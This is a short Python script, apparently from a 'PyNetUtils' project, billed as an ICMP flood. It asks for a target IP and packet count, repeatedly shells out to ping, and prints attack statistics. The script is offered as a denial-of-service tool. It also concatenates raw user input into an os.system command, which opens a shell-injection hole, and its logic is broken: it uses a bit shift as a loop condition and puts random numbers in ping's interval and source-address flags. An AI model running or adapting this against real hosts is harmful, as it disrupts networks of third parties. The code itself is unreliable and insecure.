# Simple ICMP flood python script
# Standalone PyNetUtils script
# Developed by Fortless
# https://github.com/fortless

import os
import time as t
import random as rand

version = '1.0-04_beta' # Don't touch this

bytessent = 0
randomsize = 64
sent = 0

print("PyNetUtils " + str(version))
print("Running in standalone mode")


ip = input("IP to attack [127.0.0.1]: ")
attack = 'ping ' + ip + ' -c 1 -q'
packets = input("Number of packets to send [1000]: ")

if ip == str(""):
	ip = str("127.0.0.1")

if packets == str(""):
	packets = 1000

while int(packets) >> 0:
	randomsize = rand.randrange(63, 65500)
	attack = 'ping -q -c 1 -i ' + str(randomsize) + ' -S ' + str(randomsize) + ' ' + ip + ' | grep nothing'
	os.system(attack)
	bytessent = int(bytessent) + int(randomsize)
	sent = int(sent) + 1
	packets = int(packets) - 1
	print('Left: ' + str(packets) + ', Done: ' + str(sent) + ', Packet size: ' + str(randomsize) + ', Total bytes sent: ' + str(bytessent))

avgbyte = 0
avgbyte = int(bytessent) / int(sent)
print("")
os.system('clear')
print("")
print("-----------------------------------------")
print("")
print(" -=- ICMP Attack finished! -=-")
print("")
print(" -=\- Payload  Statistics -/=-")
print("")
print("")
print("- Target IP: " + str(ip) + "/32 -")
print("- Number of packets left: " + str(packets) + " packets -")
print("- Number of packets sent: " + str(sent) + " packets -")
print("- Average packet size: " + str(avgbyte) + " bytes -")
print("- Last packet size: " + str(randomsize) + " bytes -")
print("- OS: " + str(os.name) + " -")
print("- PNU version: " + str(version) + " -")
print("")
print("PyNetUtils, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Standalone mode (ICMP Flood)")
print("-----------------------------------------")
